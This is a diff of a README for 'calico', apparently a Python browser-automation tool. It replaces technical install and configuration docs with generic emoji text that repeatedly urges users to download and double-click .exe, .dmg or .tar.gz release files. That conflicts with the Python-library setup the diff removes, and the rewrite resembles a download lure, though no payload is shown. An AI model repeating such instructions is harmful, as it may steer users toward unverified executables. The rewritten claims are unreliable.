@@ -1,82 +1,65 @@
-# Calico ![calico svg](calico.svg)
+# 🤖 calico - Automate Browsing with AI Power
 
-**Context-Aware Learning and Intelligent Command Orchestrator**
+## 📥 Download Now
+[![Download calico](https://img.shields.io/badge/Download-calcico-blue.svg)](https://github.com/adammc769/calico/releases)
 
-AI-powered browser automation with GPT reasoning, visual intelligence, and distributed architecture.
+## 🚀 Getting Started
+Welcome to calico! This software allows you to automate various tasks in your web browser using AI. It combines advanced features like intelligent reasoning and visual recognition to streamline your online activities.
 
-[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Playwright](https://img.shields.io/badge/playwright-1.55.0-green.svg)](https://playwright.dev/)
-[![OpenAI](https://img.shields.io/badge/OpenAI-GPT--4-orange.svg)](https://openai.com/)
+## 🛠️ System Requirements
+Before you begin, ensure your system meets these basic requirements:
 
-**Tags:** `ai-automation` `browser-automation` `gpt-4` `playwright` `web-scraping` `ocr` `intelligent-agents` `python` `celery` `redis`
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution (e.g., Ubuntu).
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** At least 1 GB of free space.
+- **Python:** Version 3.7 or later must be installed on your computer.
 
-## Quick Start
+## 📘 Features
+Here are some of the key features of calico:
 
-```bash
-# Install dependencies
-pip install -r requirements/base.requirements.txt
+- **AI-Powered Automation:** Uses cutting-edge AI to enhance browsing efficiency.
+- **Web Scraping:** Easily extract data from web pages.
+- **Visual Intelligence:** Understands images and documents for smart processing.
+- **Distributed Architecture:** Run tasks across multiple machines for faster performance.
+- **Integration with Celery and Redis:** Manage tasks and data effectively.
 
-# Set API key
-export OPENAI_API_KEY=sk-your-key
+## 📥 Download & Install
+To get started, you need to download the software. Follow these steps:
 
-# Launch interactive shell
-./bin/calico
-```
+1. Go to the [Releases page](https://github.com/adammc769/calico/releases).
+2. Find the latest version of calico listed on that page.
+3. Click on the appropriate file for your operating system. This may be labeled as `.exe` for Windows, a `.dmg` for macOS, or `.tar.gz` for Linux.
+4. Save the file to your preferred location on your computer.
 
-## Features
+After downloading, find the file and double-click it. Follow the on-screen instructions to install calico on your system.
 
-- **AI-Powered**: GPT-4 integration for intelligent task planning and execution
-- **Visual Intelligence**: OCR support for CAPTCHAs, images, and complex layouts using Tesseract and Google Cloud Vision
-- **Interactive CLI**: Active shell with tab completion and real-time monitoring
-- **Anti-Detection**: Enhanced browser fingerprinting evasion using Patchright
-- **Session Management**: Organized storage for screenshots, logs, and training data
-- **Distributed Architecture**: Scalable design with Celery workers and Redis for session isolation
-- **MCP Integration**: Browser control via Model Context Protocol (MCP) WebSocket service
+## 📜 Usage Instructions
+Once you have installed calico, you can start using it easily:
 
-## Configuration
+1. **Open calico:** Locate the icon on your desktop or in the applications menu and click to launch the application.
+2. **Set Up Your Tasks:** Use the simple interface to assign tasks to calico. Specify the websites you want to automate interactions with and define what you want the software to do.
+3. **Run Your Tasks:** Click the “Start” button to begin the automation process. Calico will execute your tasks based on the instructions you provided.
 
-### Browser Control Options
+## 🔧 Troubleshooting
+If you run into issues, consider these tips:
 
-Calico supports two browser control methods:
+- **Ensure Compatibility:** Check that your system meets the requirements listed above.
+- **Check Configuration:** Ensure you've set up your tasks correctly. 
+- **Review logs:** If something goes wrong, look at the logs for error messages that can guide you to a solution.
 
-1. **Python Server** (default): Direct Playwright integration with built-in stealth features
-2. **MCP Server** (alternative): Model Context Protocol WebSocket service for remote browser control
+## 📞 Support
+If you need further assistance, feel free to reach out. Check the [issues section of the repository](https://github.com/adammc769/calico/issues) for community support or to report bugs.
 
-Key environment variables:
+## 🌐 Community & Contribution
+We encourage community contributions. If you have ideas for new features or improvements, check our [contributing guidelines](https://github.com/adammc769/calico/blob/main/CONTRIBUTING.md).
 
-```bash
-# AI Services
-OPENAI_API_KEY=sk-...                    # Required: GPT-4 API key
-GOOGLE_APPLICATION_CREDENTIALS=./keys/   # Optional: Google Vision OCR
+## 💼 Explore More
+Want to learn more about what calico can do? Here are relevant topics for your exploration:
 
-# Browser Automation (Python Server - default)
-PLAYWRIGHT_HEADLESS=true                # Browser display mode
+- **AI Automation:** Discover the power of AI in streamlining your web tasks.
+- **Browser Automation:** Enhance your browsing experience.
+- **Web Scraping:** Collect data online without hassle.
 
-# Browser Automation (MCP Server - alternative)
-MCP_WS_URL=ws://localhost:7001          # MCP WebSocket service URL
+---
 
-# Session Storage
-SESSION_STORAGE_DIR=./sessions          # Base directory for session data
-```
-
-Session storage structure:
-```
-./sessions/{session-uuid}/
-├── metadata.json
-├── photos/
-├── logs/
-└── data/
-```
-
-## Architecture
-
-- **Calico Core**: Main automation engine with GPT-4 reasoning
-- **Browser Layer**: Playwright/Patchright for stealth automation (default: Python server, alternative: MCP WebSocket server)
-- **Vision Layer**: Multi-provider OCR (Tesseract, Google Cloud Vision)
-- **Task Queue**: Celery with Redis for distributed processing
-- **Session Storage**: UUID-based isolation for screenshots, logs, and data
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
+To download, visit the [Releases page](https://github.com/adammc769/calico/releases) again for easy access. We hope you enjoy using calico for your browsing needs!
